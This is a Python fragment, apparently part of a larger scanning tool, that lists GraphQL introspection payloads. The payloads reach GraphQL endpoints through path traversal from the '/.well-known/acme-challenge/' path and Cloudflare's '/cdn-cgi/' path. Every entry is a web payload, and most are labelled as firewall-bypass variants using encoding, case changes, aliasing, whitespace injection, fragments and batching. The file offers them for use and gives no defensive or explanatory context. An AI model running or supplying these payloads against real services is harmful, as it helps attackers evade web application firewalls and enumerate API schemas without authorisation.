"""
GraphQL Introspection Payloads with WAF Bypass
"""

# 14. GraphQL introspection (often bypassed through ACME path)
GRAPHQL_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/..;/graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../api/graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../graphql?query={__schema{queryType{name}mutationType{name}subscriptionType{name}}}",
    "/.well-known/acme-challenge/{token}/../graphql?query=query{__schema{types{name,fields{name}}}}",
    
    # ============================================
    # WAF BYPASS VARIATIONS FOR GRAPHQL
    # ============================================
    
    # URL encoded query
    "/.well-known/acme-challenge/{token}/../graphql?query=%7b__schema%7btypes%7bname%7d%7d%7d",
    "/.well-known/acme-challenge/{token}/../graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D",
    
    # Double URL encoded
    "/.well-known/acme-challenge/{token}/../graphql?query=%257b__schema%257btypes%257bname%257d%257d%257d",
    
    # POST with GET query bypass
    "/.well-known/acme-challenge/{token}/../graphql",  # POST body: {"query":"{__schema{types{name}}}"}
    
    # Case manipulation
    "/.well-known/acme-challenge/{token}/../GRAPHQL?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../GraphQL?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../graphQL?query={__schema{types{name}}}",
    
    # Path variations
    "/.well-known/acme-challenge/{token}/../graphql/?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/..//graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../graphql///?query={__schema{types{name}}}",
    
    # Alternative endpoints
    "/.well-known/acme-challenge/{token}/../api/graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../v1/graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../v2/graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../gql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../graphiql?query={__schema{types{name}}}",
    
    # Query aliasing bypass
    "/.well-known/acme-challenge/{token}/../graphql?query={a:__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../graphql?query={alias:__schema{types{b:name}}}",
    
    # Newline/whitespace bypass
    "/.well-known/acme-challenge/{token}/../graphql?query={%0a__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../graphql?query={__schema%0a{types{name}}}",
    "/.well-known/acme-challenge/{token}/../graphql?query={%20__schema{types{name}}}",
    
    # Fragment bypass
    "/.well-known/acme-challenge/{token}/../graphql?query={...on%20Query{__schema{types{name}}}}",
    
    # operationName bypass
    "/.well-known/acme-challenge/{token}/../graphql?query={__schema{types{name}}}&operationName=null",
    
    # Batching bypass
    "/.well-known/acme-challenge/{token}/../graphql?query=[{\"query\":\"{__schema{types{name}}}\"}]",
    
    # Cloudflare specific
    "/cdn-cgi/../graphql?query={__schema{types{name}}}",
    "/cdn-cgi/..%2fgraphql?query={__schema{types{name}}}",
]
